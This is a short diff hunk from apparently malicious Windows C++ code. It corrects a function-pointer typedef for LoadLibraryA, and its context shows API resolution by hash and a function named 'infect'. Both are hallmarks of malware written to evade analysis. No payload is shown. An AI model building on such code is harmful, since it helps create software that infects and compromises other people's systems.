@@ -89,7 +89,7 @@ LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, std::uint32_t hash)
    return nullptr;
 }
 
-typedef HMODULE (LoadLibraryAHeader *)(LPCSTR);
+typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
 
 void infect(void)
 {
